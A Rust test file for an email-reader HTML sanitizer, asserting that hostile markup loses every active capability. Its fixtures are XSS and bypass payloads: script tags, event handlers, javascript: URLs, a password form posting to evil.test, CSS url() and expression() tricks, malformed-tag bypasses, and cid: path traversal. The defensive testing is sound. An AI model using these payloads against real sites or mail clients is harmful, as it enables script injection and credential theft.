//! Hostile-markup tests for the archived-email reader.
//!
//! Every case here is written from the attacker's side: the assertion is that a
//! specific capability is *absent* from the output, not that the sanitizer
//! produced some expected string. Output formatting may change freely; a
//! surviving capability is a security regression.
//!
//! These fixtures are the gate on upgrading the pinned `ammonia` version.

use strife_media::{InlinePart, SanitizeOptions, sanitize_email_html};
use uuid::Uuid;

/// Default posture: no message identity needed, no inline parts, nothing
/// revealed. Every test that cares about one of those states it explicitly.
fn options<'a>(node_id: Uuid, inline: &'a [InlinePart<'a>]) -> SanitizeOptions<'a> {
    SanitizeOptions {
        node_id,
        inline,
        allow_remote_images: false,
    }
}

fn clean(html: &str) -> String {
    sanitize_email_html(html, &options(Uuid::nil(), &[])).html
}

/// Substrings that must never survive into rendered output, regardless of how
/// the sanitizer chose to rewrite the surrounding markup.
fn assert_inert(output: &str, forbidden: &[&str]) {
    let lowered = output.to_ascii_lowercase();
    for needle in forbidden {
        assert!(
            !lowered.contains(needle),
            "{needle:?} survived sanitizing: {output}"
        );
    }
}

#[test]
fn scripts_are_removed_with_their_source() {
    let output = clean("<p>Before</p><script>alert(document.cookie)</script><p>After</p>");
    // The element must go, and so must its text: a stripped-tag-only sanitizer
    // would leave "alert(document.cookie)" as visible message text.
    assert_inert(&output, &["<script", "alert(", "document.cookie"]);
    assert!(output.contains("Before") && output.contains("After"));
}

#[test]
fn event_handlers_do_not_survive_on_any_element() {
    let output = clean(
        r#"<div onclick="steal()" onmouseover="steal()" ONLOAD="steal()">
           <a href="https://example.test" onfocus="steal()">link</a>
           <img src="cid:none" onerror="steal()" alt="x">
         </div>"#,
    );
    assert_inert(
        &output,
        &[
            "onclick",
            "onmouseover",
            "onload",
            "onfocus",
            "onerror",
            "steal(",
        ],
    );
}

#[test]
fn javascript_and_data_urls_are_not_navigable() {
    let output = clean(
        r#"<a href="javascript:alert(1)">a</a>
           <a href="JaVaScRiPt:alert(1)">b</a>
           <a href="data:text/html;base64,PHNjcmlwdD4=">c</a>
           <a href="vbscript:msgbox(1)">d</a>
           <a href="  javascript:alert(1)">e</a>"#,
    );
    assert_inert(&output, &["javascript:", "vbscript:", "data:text/html"]);
}

#[test]
fn forms_and_inputs_cannot_submit_anywhere() {
    let output = clean(
        r#"<form action="https://evil.test/collect" method="post">
             <input name="password" type="password">
             <button type="submit">Send</button>
           </form>"#,
    );
    assert_inert(
        &output,
        &["<form", "<input", "<button", "evil.test", "action="],
    );
}

#[test]
fn plugin_and_frame_content_is_removed() {
    let output = clean(
        r#"<object data="https://evil.test/x.swf"></object>
           <embed src="https://evil.test/x.swf">
           <iframe src="https://evil.test/frame"></iframe>
           <frame src="https://evil.test/f">
           <applet code="Evil.class"></applet>"#,
    );
    assert_inert(
        &output,
        &[
            "<object",
            "<embed",
            "<iframe",
            "<frame",
            "<applet",
            "evil.test",
        ],
    );
}

#[test]
fn stylesheets_and_css_imports_cannot_be_pulled_in() {
    let output = clean(
        r#"<link rel="stylesheet" href="https://evil.test/s.css">
           <style>@import url("https://evil.test/s.css"); body { color: red }</style>
           <p style="background: url(https://evil.test/pixel.png)">text</p>"#,
    );
    assert_inert(
        &output,
        &[
            "<link",
            "<style",
            "@import",
            "url(",
            "evil.test",
            "background",
        ],
    );
    assert!(
        output.contains("text"),
        "message text should survive: {output}"
    );
}

#[test]
fn meta_refresh_cannot_redirect_the_reader() {
    let output = clean(
        r#"<meta http-equiv="refresh" content="0;url=https://evil.test">
           <base href="https://evil.test/">
           <p>body</p>"#,
    );
    assert_inert(&output, &["<meta", "<base", "http-equiv", "evil.test"]);
}

#[test]
fn svg_is_treated_as_active_content_and_dropped() {
    let output = clean(
        r#"<svg xmlns="http://www.w3.org/2000/svg" onload="steal()">
             <script>steal()</script>
             <use href="https://evil.test/x.svg#y"/>
           </svg>
           <math><mtext><script>steal()</script></mtext></math>"#,
    );
    assert_inert(
        &output,
        &[
            "<svg",
            "<use",
            "<math",
            "<script",
            "onload",
            "steal(",
            "evil.test",
        ],
    );
}

#[test]
fn remote_images_are_blocked_and_counted_by_host() {
    let result = sanitize_email_html(
        r#"<img src="https://tracker.test/open.gif?id=1" alt="pixel">
           <img src="http://cdn.example.test/logo.png" alt="logo">
           <img src="https://tracker.test/second.gif" alt="two">"#,
        &options(Uuid::nil(), &[]),
    );
    assert_inert(&result.html, &["tracker.test", "cdn.example.test"]);
    assert_eq!(result.blocked_remote_count, 3);
    // Hosts are deduplicated, so the reader reports two correspondents' servers
    // rather than three requests.
    assert_eq!(
        result.blocked_hosts,
        vec!["cdn.example.test".to_owned(), "tracker.test".to_owned()]
    );
    // The alt text has to survive or the reader shows an unexplained gap.
    assert!(result.html.contains("pixel"), "{}", result.html);
}

#[test]
fn protocol_relative_and_scheme_variant_images_are_still_remote() {
    for source in [
        "//tracker.test/pixel.gif",
        "HTTPS://tracker.test/pixel.gif",
        "  https://tracker.test/pixel.gif  ",
    ] {
        let result = sanitize_email_html(
            &format!(r#"<img src="{source}" alt="x">"#),
            &options(Uuid::nil(), &[]),
        );
        assert_inert(&result.html, &["tracker.test"]);
        assert_eq!(
            result.blocked_remote_count, 1,
            "{source} was not counted as remote"
        );
    }
}

#[test]
fn inline_references_resolve_only_within_their_own_message() {
    let node_id = Uuid::from_u128(0x5717_f300);
    let result = sanitize_email_html(
        r#"<img src="cid:logo@sender.test" alt="logo">
           <img src="cid:not-in-this-message" alt="missing">"#,
        &options(
            node_id,
            &[InlinePart {
                content_id: "<LOGO@sender.test>",
                part_path: "2.1",
            }],
        ),
    );
    // Known part: rewritten to this message's own authenticated endpoint.
    assert!(
        result
            .html
            .contains(&format!("/api/email/messages/{node_id}/parts/2.1")),
        "{}",
        result.html
    );
    assert_eq!(result.inline_parts, vec!["2.1".to_owned()]);
    // Unknown part: dropped, not guessed at, and surfaced as a warning.
    assert_inert(&result.html, &["cid:", "not-in-this-message"]);
    assert_eq!(result.warnings.len(), 1, "{:?}", result.warnings);
    // A cid: reference is never counted as a remote network request.
    assert_eq!(result.blocked_remote_count, 0);
}

#[test]
fn inline_references_cannot_be_steered_at_another_message() {
    let node_id = Uuid::from_u128(1);
    let other = Uuid::from_u128(2);
    let result = sanitize_email_html(
        &format!(
            r#"<img src="cid:../../{other}/parts/9" alt="a">
               <img src="cid:/etc/passwd" alt="b">"#
        ),
        &options(
            node_id,
            &[InlinePart {
                content_id: "real@x",
                part_path: "2",
            }],
        ),
    );
    // Neither reference matches a declared part, so neither resolves at all —
    // traversal never reaches URL construction.
    assert_inert(&result.html, &[&other.to_string(), "etc/passwd", ".."]);
    assert!(result.inline_parts.is_empty());
}

#[test]
fn data_urls_keep_inert_rasters_and_drop_active_svg() {
    let raster = sanitize_email_html(
        r#"<img src="data:image/png;base64,iVBORw0KGgo=" alt="ok">"#,
        &options(Uuid::nil(), &[]),
    );
    assert!(raster.html.contains("data:image/png"), "{}", raster.html);

    let active = sanitize_email_html(
        r#"<img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0Lz48L3N2Zz4=" alt="no">
           <img src="data:text/html,<script>steal()</script>" alt="no">"#,
        &options(Uuid::nil(), &[]),
    );
    assert_inert(&active.html, &["svg+xml", "text/html", "script"]);
}

#[test]
fn links_keep_safe_schemes_and_cannot_reach_the_opener() {
    let output = clean(
        r#"<a href="https://example.test/a">https</a>
           <a href="mailto:ada@example.test">mail</a>
           <a href="/relative/path">relative</a>
           <a href="file:///etc/passwd">file</a>"#,
    );
    assert!(output.contains("https://example.test/a"), "{output}");
    assert!(output.contains("mailto:ada@example.test"), "{output}");
    // rel is what denies the opened page access to Strife's window.
    assert!(output.contains("noopener"), "{output}");
    assert!(output.contains("noreferrer"), "{output}");
    // An archived message has no base URL, so a relative href would resolve
    // against Strife's own origin.
    assert_inert(&output, &["/relative/path", "file:", "etc/passwd"]);
}

#[test]
fn inline_styles_keep_layout_and_drop_anything_that_fetches_or_escapes() {
    let output = clean(
        r#"<p style="color: #333; font-weight: bold; background-image: url(https://evil.test/p.png);
                     position: fixed; top: 0; behavior: url(#default#time2);
                     width: expression(alert(1)); margin: 4px">styled</p>"#,
    );
    // Kept: inert presentation.
    assert!(output.contains("color"), "{output}");
    assert!(output.contains("font-weight"), "{output}");
    assert!(output.contains("margin"), "{output}");
    // Dropped: fetching, positioning, and legacy execution vectors.
    assert_inert(
        &output,
        &[
            "background-image",
            "url(",
            "evil.test",
            "position",
            "behavior",
            "expression",
        ],
    );
}

#[test]
fn css_escapes_and_comments_cannot_smuggle_a_fetch() {
    let output = clean(
        r#"<p style="color: \75 rl(https://evil.test/x)">a</p>
           <p style="color: u/**/rl(https://evil.test/x)">b</p>
           <p style="color: red !important">c</p>"#,
    );
    assert_inert(&output, &["evil.test", "\\75", "/*", "!important"]);
}

#[test]
fn malformed_and_nested_markup_does_not_reopen_a_blocked_element() {
    // html5ever's error recovery is the reason parsing is delegated rather than
    // pattern-matched: each of these is a classic regex-sanitizer bypass.
    let output = clean(
        r#"<scr<script>ipt>steal()</script>
           <img src="x" alt="a"><<img src=https://evil.test/x onerror=steal()>
           <p title="><script>steal()</script>">t</p>
           <!--><script>steal()</script>-->"#,
    );
    // What matters is that no executable context survives. Fragments of the
    // broken markup do remain as escaped *text* — `steal()` is visible in the
    // message body the way any other literal string would be, which is the
    // faithful rendering of what the sender actually wrote.
    assert_inert(&output, &["<script", "onerror", "evil.test"]);
    assert!(
        !output.contains("<scr"),
        "a partial tag was reassembled: {output}"
    );
}

#[test]
fn an_empty_or_text_only_body_is_handled_without_panicking() {
    assert_eq!(clean(""), "");
    assert!(clean("just text").contains("just text"));
    let deep = "<div>".repeat(200) + "deep" + &"</div>".repeat(200);
    assert!(clean(&deep).contains("deep"));
}

#[test]
fn revealing_remote_images_restores_only_image_sources() {
    let hostile = r#"<p>Hello</p>
        <script>steal()</script>
        <img src="https://tracker.test/open.gif" alt="pixel">
        <a href="javascript:alert(1)">bad</a>
        <p style="background: url(https://evil.test/x.png)">styled</p>"#;
    let revealed = sanitize_email_html(
        hostile,
        &SanitizeOptions {
            node_id: Uuid::nil(),
            inline: &[],
            allow_remote_images: true,
        },
    );

    // The one thing consent buys: the image loads.
    assert!(
        revealed.html.contains("https://tracker.test/open.gif"),
        "{}",
        revealed.html
    );
    // Consent to images is not consent to anything else.
    assert_inert(
        &revealed.html,
        &["<script", "steal(", "javascript:", "evil.test", "url("],
    );
    // The count still reports what was contacted, so the warning stays truthful
    // after the user has revealed.
    assert_eq!(revealed.blocked_remote_count, 1);
    assert_eq!(revealed.blocked_hosts, vec!["tracker.test".to_owned()]);
}
